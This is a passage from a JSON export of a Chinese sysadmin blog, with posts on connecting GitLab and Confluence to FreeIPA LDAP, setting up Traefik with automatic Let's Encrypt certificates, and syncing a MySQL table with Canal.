class=\"s1\"\u003e\u0026#39;xxxxxx\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        timeout: \u003cspan class=\"m\"\u003e10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        active_directory: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        allow_username_or_email_login: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        block_auto_created_users: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        base: \u003cspan class=\"s1\"\u003e\u0026#39;dc=bybon,dc=cn\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        user_filter: \u003cspan class=\"s1\"\u003e\u0026#39;(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=gitlab-users,cn=groups,cn=accounts,dc=bybon,dc=cn))\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        attributes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          username: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;uid\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          email:    \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;mail\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          name:       \u003cspan class=\"s1\"\u003e\u0026#39;displayName\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          first_name: \u003cspan class=\"s1\"\u003e\u0026#39;givenName\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          last_name:  \u003cspan class=\"s1\"\u003e\u0026#39;sn\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          lowercase_usernames: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e新版本的话，按字段比较即可。注意上面，我是提前建立了一个 gitlab-users 的组，把用户先都放进组里，这样方便管理。\u003c/p\u003e","title":"Gitlab集成进freeIPA进行统一认证"},{"content":"公司决定用统一用户管理系统，那必然是微软的 AD 和开源的 LDAP 二选一了\n自然用 Freeipa 作为首选。\n花时间仔细调研了一下，先说结论：\n如果 confluence 已经有很多用户，那么对不起，这些用户的密码都必须通知到个人，强制进行修改，旧有的密码完全无法导出（除非一个一个人问出来）。\nconfluence 实际上是用了一个内置的目录软件来管理用户的，用户唯一存在的凭据就是邮箱。\nconfluence 支持同时从多个目录树中按照顺序来查询用户，查询到的结果会合并。举例来说，排第一的目录树是freeipa，排第二位的目录树是内置目录，两个目录树都有一个用户，两条记录的邮件是一致的，那么会在排第一的 freeipa 树中认证用户，但会把两个目录树中用户的信息拼接合并起来总体返回。\n这样就明白了把，我们只用第一个 freeipa 目录树来认证用户，原有的组权限还是用第二个内置目录树中的信息，保持两棵树中用户的 mail 保持一致即可，步骤如下。\n我们首先要提前在freeIPA里面建立两个组：\nconfluence-administrators\nconfluence-users\n然后跑到 Confluence 里，用户目录，添加一个 freeipa 的目录服务放在前面\n详细配置的参数如下：\n配置如下： Server Settings: - Namel: freeipa - Directory Type: OpenLDAP - Server: example.com - Port: 389 - Use SLL: false - Username: uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn - Password: \u0026lt;insert password here\u0026gt; LDAP Schema: - Base DN: dc=bybon,dc=cn - Additional User DN: cn=users,cn=accounts - Additional Group DN:cn=groups,cn=accounts LDAP Permissions: Select Read/Write Advanced Settings: Default User Schema Settings - User Object Class: inetorgperson - User Object Filter: (\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn)) - User Name Attribute: uid - User Name RDN Attribute: uid - User First Name Attribute: giveName - User Last Name Attribute: sn - User Display Name Attribute: displayName - User Email Attribute: mail - User Password Attribute: userPassword - User Password Encryption: SHA - User Unique ID Attribute: uid Group Schema Settings - Group Object Class: groupofnames # all lowercase - Group Object Filter: (objectclass=groupofnames) # all lowercase - Group Name Attribute: cn - Group Description Attribute: description Membership Schema Settings - Group Members Attribute: member #lowercase - User Membership Attribute:memberOf 放全中文的图如下：\n折磨了很久才弄出来，验证一下用户：\n跑到 confluence 里面查看，明显是两个目录树合并的结果：\n关于 admin 的问题，注意一下，我们上面找用户的 filter 是找不到 admin 用户的。但是第一步认证是 ldap 做的，认证过了以后，freeipa 的 ldap filter 过滤后找不到 admin 这个用户，所以只会在内置目录有 admin 的信息，下面验证一下，admin 只存在于 Confluence Internal Directory 中。\n再补充一点，freeipa 是可以匿名访问的，但是匿名状态下，一些属性字段是看不见的，比如 mail 。\n所以想要查到全部字段，必须登录，放一个查询的脚本：\nldapsearch -W -D uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn -h localhost -b cn=users,cn=accounts,dc=bybon,dc=cn \u0026#39;(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn))\u0026#39; ","permalink":"https://rendoumi.com/posts/20230216-freeipa_confluence/","summary":"\u003cp\u003e公司决定用统一用户管理系统，那必然是微软的 AD 和开源的 LDAP 二选一了\u003c/p\u003e\n\u003cp\u003e自然用 Freeipa 作为首选。\u003c/p\u003e\n\u003cp\u003e花时间仔细调研了一下，先说结论：\u003c/p\u003e\n\u003cp\u003e如果 confluence 已经有很多用户，那么对不起，这些用户的密码都必须通知到个人，强制进行修改，旧有的密码完全无法导出（除非一个一个人问出来）。\u003c/p\u003e\n\u003cp\u003econfluence 实际上是用了一个内置的目录软件来管理用户的，用户唯一存在的凭据就是邮箱。\u003c/p\u003e\n\u003cp\u003econfluence 支持同时从多个目录树中按照顺序来查询用户，查询到的结果会合并。举例来说，排第一的目录树是freeipa，排第二位的目录树是内置目录，两个目录树都有一个用户，两条记录的邮件是一致的，那么会在排第一的 freeipa 树中认证用户，但会把两个目录树中用户的信息拼接合并起来总体返回。\u003c/p\u003e\n\u003cp\u003e这样就明白了把，我们只用第一个 freeipa 目录树来认证用户，原有的组权限还是用第二个内置目录树中的信息，保持两棵树中用户的 mail 保持一致即可，步骤如下。\u003c/p\u003e\n\u003cp\u003e我们首先要提前在freeIPA里面建立两个组：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003econfluence-administrators\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003econfluence-users\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230216171408006\" loading=\"lazy\" src=\"/posts/20230216-freeipa_confluence/image-20230216171408006.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后跑到 Confluence 里，用户目录，添加一个 freeipa 的目录服务放在前面\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230216171611828\" loading=\"lazy\" src=\"/posts/20230216-freeipa_confluence/image-20230216171611828.png\"\u003e\u003c/p\u003e\n\u003cp\u003e详细配置的参数如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e配置如下：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eServer Settings:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Namel: freeipa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Directory Type: OpenLDAP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Server: example.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Port: \u003cspan class=\"m\"\u003e389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Use SLL: \u003cspan class=\"nb\"\u003efalse\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Username: \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eadmin,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Password: \u0026lt;insert password here\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP Schema:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Base DN: \u003cspan class=\"nv\"\u003edc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Additional User DN: \u003cspan class=\"nv\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eusers,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Additional Group DN:cn\u003cspan class=\"o\"\u003e=\u003c/span\u003egroups,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLDAP Permissions:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSelect Read/Write\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAdvanced Settings: Default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUser Schema Settings\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Object Class: inetorgperson\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Object Filter: \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eobjectclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003einetorgperson\u003cspan class=\"o\"\u003e)(\u003c/span\u003e\u003cspan class=\"nv\"\u003ememberOf\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003ecn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003econfluence-users,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003egroups,cn\u003cspan class=\"o\"\u003e=\u003c/span\u003eaccounts,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ebybon,dc\u003cspan class=\"o\"\u003e=\u003c/span\u003ecn\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Name Attribute: uid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Name RDN Attribute: uid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User First Name Attribute: giveName\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Last Name Attribute: sn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Display Name Attribute: displayName\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Email Attribute: mail\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Password Attribute: userPassword\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Password Encryption: SHA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Unique ID Attribute: uid\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGroup Schema Settings\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Object Class: groupofnames \u003cspan class=\"c1\"\u003e# all lowercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Object Filter: \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eobjectclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003egroupofnames\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e# all lowercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Name Attribute: cn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Description Attribute: description\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMembership Schema Settings\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- Group Members Attribute: member \u003cspan class=\"c1\"\u003e#lowercase\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e- User Membership Attribute:memberOf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e放全中文的图如下：\u003c/p\u003e","title":"Confluence集成进freeIPA进行统一认证"},{"content":"nginx和traefik都可以做ingress，在入口处做证书的卸载，并转发tcp、udp、https、http流量\nnginx是比较通常的做法，traefik配置比较简单，尤其是配置自动续签的证书\nwget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz 解压释放出来traefik文件，建立目录/export/servers/traefik\n结构如下：\ntraefik.yml\nlog:\rlevel: DEBUG\rapi:\rinsecure: false\rdashboard: true\rentryPoints:\rhttp:\raddress: \u0026#34;:80\u0026#34;\r#http:\r# redirections:\r# entryPoint:\r# to: https\r# scheme: https\rhttps:\raddress: \u0026#34;:443\u0026#34;\rcertificatesResolvers:\rletsEncrypt:\racme:\rstorage: /export/servers/traefik/acme.json\remail: zhangranrui@rendoumi.com\rtlsChallenge: {}\rhttpChallenge:\rentryPoint: http\rproviders:\rfile:\rdirectory: /export/servers/traefik/dynamic\rwatch: true 上面我们定义了log的level为DEBUG，并且开放了dashboard\n定义了2个入口，http和https，可以直接用中间件强制http跳转https\n然后定义了letsEncrypt的证书机构\n最后定义了动态监控 /export/servers/traefik/dynamic 目录，如果下面有增加文件会自动更新配置。\n然后再dynamic目录下定义转发routes\n注意命名文件，test7是域名，01是序列号，文件内容中svc的序列号最好跟文件名一致，如果多文件重复会导致配置不可用！！！\ntest7-01.yml\nhttp:\rrouters:\rhttps_01:\rrule: \u0026#34;Host(`test7.ddky.com`)\u0026#34;\rservice: svc_01\rtls:\rcertresolver: letsEncrypt\rhttp:\rrule: \u0026#34;Host(`test7.ddky.com`)\u0026#34;\rservice: svc_01\rentryPoints:\r- http\rservices:\rsvc_01:\rloadBalancer:\rservers:\r- url: \u0026#34;http://172.16.8.1:80\u0026#34; test8-02.yml\nhttp:\rrouters:\rhttps_02:\rrule: \u0026#34;Host(`test8.ddky.com`)\u0026#34;\rservice: svc_02\rtls:\rcertresolver: letsEncrypt\rhttp_02:\rrule: \u0026#34;Host(`test8.ddky.com`)\u0026#34;\rservice: svc_02\rentryPoints:\r- http\rservices:\rsvc_02:\rloadBalancer:\rservers:\r- url: \u0026#34;http://172.18.31.33:80\u0026#34; dashboard.yml\nhttp:\rrouters:\rapi-router:\rrule: \u0026#34;PathPrefix(`/api`) || PathPrefix(`/dashboard`)\u0026#34;\rservice: api@internal\rentryPoints:\r- http\rmiddlewares:\r- dashboard-login\rmiddlewares:\rdashboard-login:\rbasicAuth:\rusers:\r- \u0026#34;admin:$apr1$u1xEoYqW$V5O5t4rmdly58WqS4nTVq1\u0026#34; 打开http://192.168.85.202/dashboard/#/\nuser: admin pass: xxxxxxxx\n这样就可以了\n","permalink":"https://rendoumi.com/posts/20230131-traefik_certificate/","summary":"\u003cp\u003enginx和traefik都可以做ingress，在入口处做证书的卸载，并转发tcp、udp、https、http流量\u003c/p\u003e\n\u003cp\u003enginx是比较通常的做法，traefik配置比较简单，尤其是配置自动续签的证书\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ewget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e解压释放出来traefik文件，建立目录/export/servers/traefik\u003c/p\u003e\n\u003cp\u003e结构如下：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230131-traefik_certificate/2021-07-21_100638.png\"\u003e\u003c/p\u003e\n\u003cp\u003etraefik.yml\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003elog:\r\n  level: DEBUG\r\n\r\napi:\r\n  insecure: false\r\n  dashboard: true\r\n\r\nentryPoints:\r\n  http:\r\n    address: \u0026#34;:80\u0026#34;\r\n    #http:\r\n    #  redirections:\r\n    #    entryPoint:\r\n    #      to: https\r\n    #      scheme: https\r\n\r\n  https:\r\n    address: \u0026#34;:443\u0026#34;\r\n\r\n\r\n\r\ncertificatesResolvers:\r\n  letsEncrypt:\r\n    acme:\r\n      storage: /export/servers/traefik/acme.json\r\n      email: zhangranrui@rendoumi.com\r\n      tlsChallenge: {}\r\n      httpChallenge:\r\n        entryPoint: http\r\n\r\nproviders:\r\n  file:\r\n    directory: /export/servers/traefik/dynamic\r\n    watch: true\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面我们定义了log的level为DEBUG，并且开放了dashboard\u003c/p\u003e\n\u003cp\u003e定义了2个入口，http和https，可以直接用中间件强制http跳转https\u003c/p\u003e\n\u003cp\u003e然后定义了letsEncrypt的证书机构\u003c/p\u003e\n\u003cp\u003e最后定义了动态监控 /export/servers/traefik/dynamic 目录，如果下面有增加文件会自动更新配置。\u003c/p\u003e\n\u003cp\u003e然后再dynamic目录下定义转发routes\u003c/p\u003e\n\u003cp\u003e注意命名文件，test7是域名，01是序列号，文件内容中svc的序列号最好跟文件名一致，如果多文件重复会导致配置不可用！！！\u003c/p\u003e\n\u003cp\u003etest7-01.yml\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttp:\r\n  routers:\r\n    https_01:\r\n      rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34;\r\n      service: svc_01\r\n      tls:\r\n        certresolver: letsEncrypt\r\n\r\n    http:\r\n      rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34;\r\n      service: svc_01\r\n      entryPoints:\r\n        - http\r\n\r\n  services:\r\n    svc_01:\r\n      loadBalancer:\r\n        servers:\r\n          - url: \u0026#34;http://172.16.8.1:80\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003etest8-02.yml\u003c/p\u003e","title":"traefik自动签发并续费证书+端口转发"},{"content":"普遍的大数据抽数的方式都是从散落在各个地方的 MySQL 数据库中开账号，然后把数据同步过来。\n这不，大数据的同事提出了一个需求，想把某个库中的某个表的数据单独同步到大数据的统一库中的某个表中。\n研究了一个星期，canal 的配置对运维来说非常的不友好，除非用它那个 admin 的 dashboard，但是运维通常是 cli 界面，谁没事装个 dashboard 来配置呢，太 low 了。\n用的是 canal 1.1.5 的版本，不能升级，升级后 java 不对了。还没有到用 1.1.6 的时候！\n背景：\n源数据库：10.8.2.12 库：xxl_job 表：demotable666 目的数据库：10.8.2.17 库：xxl_job_bak 表：demotable666 而且不用任何的Zookeeper、Kafka、RabbitMQ的中间件，越简洁越好。\n一、安装canal wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.deployer-1.1.5.tar.gz wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.adapter-1.1.5.tar.gz #都装到 /app 目录下 mkdir /app mkdir /app/deploy mkdir /app/adapter cd /app/deploy tar zxvf canal.deployer-1.1.5.tar.gz cd /app/adapter tar zxvf canal.adapter-1.1.5.tar.gz 二、MySQL源准备 # /etc/my.cnf 加入以下几项并重启 [mysqld] log-bin=mysql-bin # Start log bin. binlog_format=ROW # Log format. server-id=1 # Server id,different from slave. 授权binlog同步：\n# 创建用户授权 mysql\u0026gt; CREATE USER canal IDENTIFIED BY \u0026#39;canal\u0026#39;; mysql\u0026gt; GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO \u0026#39;canal\u0026#39;@\u0026#39;10.8.2.17\u0026#39; identified by \u0026#34;xxxxxx\u0026#34;; mysql\u0026gt; FLUSH PRIVILEGES; # 查看授权 mysql\u0026gt; show grants for \u0026#39;canal\u0026#39;; 三、配置deploy 其实关键就是两个配置\n1、canal.properties\nmkdir /app/deploy/conf/10.8.2.12 cp /app/deploy/conf/example/instance.properties /app/deploy/conf/10.8.2.12 vi /app/deploy/conf/canal.properties #就改两个地方 canal.destinations = 10.8.2.12 canal.auto.scan = false 注意，上面一定要把 canal.auto.scan 修改成 false，否则它会自动扫描 conf 目录下的所有配置，这样 example 子目录无论是否有用到，配置都会被扫进去。这不是神经病么，典型的 java 程序猿自以为是的配置。\n2、instance.properties 的配置\nvi /app/deploy/conf/10.8.2.12/instance.properties # instance.properties 是拷贝example目录中的 # 改动 canal.instance.master.address=10.8.2.12:3306 canal.instance.tsdb.enable=false # username/password canal.instance.dbUsername=canal canal.instance.dbPassword=xxxxxx # table regex #1. 所有表：.* or .*\\\\..* #2. canal schema下所有表： canal\\\\..* #3. canal下的以canal打头的表：canal\\\\.canal.* #4. canal schema下的一张表：canal\\\\.test1 #5. 多个规则组合使用：canal\\\\..*,mysql.test1,mysql.test2 (逗号分隔) #canal.instance.filter.regex=.*\\\\..* canal.instance.filter.regex=xxl_job\\\\..* 上面其实就是设置了 canal 去伪装成一个 slave，读取 binlog 日志，并且过滤只读取 xxl_job 的日志。\n启动 deploy\ncd /app/deploy/bin ./startup.sh 看看日志无异常即可：\n四、准备好目的数据库的库表结构 源数据库已经有 demotable666 的表了，我们需要在目的数据库事先准备好 demotable666\n# 在 10.8.2.17 的 xxl_job_bak 库上执行 mysql\u0026gt; use xxl_job_bak; mysql\u0026gt; create table demotable666( UserId int NOT NULL AUTO_INCREMENT PRIMARY KEY, UserName varchar(100), UserLoginDate date NOT NULL ); Query OK, 0 rows affected (0.04 sec) 五、设置adapter 1、application.yml\n首先给 canal 的机器对目的库赋 mysql 权\nmysql\u0026gt; grant all privileges on xxl_job_bak.* to sync_17@\u0026#39;%\u0026#39; identified by \u0026#34;xxxxxx\u0026#34;; mysql\u0026gt; flush privileges; 然后编辑application.yml\nvi /app/adapter/conf/application.yml #注释掉srcDataSources，mysql 同步到 mysql的场景中完全用不到这个，es要用到 # srcDataSources: # defaultDS: # url: jdbc:mysql://127.0.0.1:3306/mytest?useUnicode=true # username: root # password: 121212 canalAdapters: - instance: 10.8.2.12 # canal instance Name or mq topic name groups: - groupId: g1 outerAdapters: - name: logger - name: rdb key: mysqlbak1 properties: jdbc.driverClassName: com.mysql.jdbc.Driver jdbc.url: jdbc:mysql://10.8.2.17:3306/xxl_job_bak?useUnicode=true jdbc.username: sync_17 jdbc.password: xxxxxx 注意上面配的instance，这个跟deploy里面的instance没有半毛钱关系，这个是为了rdb里面的配置参考用的。\n2、编辑表同步配置文件mysqlbak1.yml\n注意上面的jdbc.url指定了库是xxl_job_bak，所以下面配置的 targetTable 就是单独一个 demotable666，很多文章里写库名.表名， xxl_job_bak.demotable666，八戒是没这样成功。\n#用不到的挪成备份 mv /app/adapter/conf/rdb/mytest_user.yml /app/adapter/conf/rdb/mytest_user.bak vi /app/adapter/conf/rdb/mysqlbak1.yml #dataSourceKey: mysqlbakDS1 # cannal的instance或者MQ的topic destination: 10.8.2.12 groupId: g1 outerAdapterKey: mysqlbak1 concurrent: true dbMapping: database: xxl_job table: demotable666 targetTable: demotable666 targetPk: UserId: UserId # mapAll: true targetColumns: UserId: UserName: UserLoginDate: # etlCondition: \u0026#34;where c_time\u0026gt;={}\u0026#34; commitBatch: 1 # 批量提交的大小 启动 adapter：\ncd /app/adapter/bin ./startup.sh 这样就好了。\n在10.8.2.12的源数据库上插入数据：\ninsert into demotable666(UserName,UserLoginDate) values(\u0026#39;john\u0026#39;,DATE(NOW())); 在 10.8.2.17 可以看到新数据自动过来了，这样就搞定了。\n六、拓展整库同步 上面我们实现了表同步，下面拓展说一下如何实现整库的同步：\n1、设置application.yml，rdb增加一个key: mysqlbak2，jdbc.url 连接串不设置库名\ncanalAdapters: - instance: 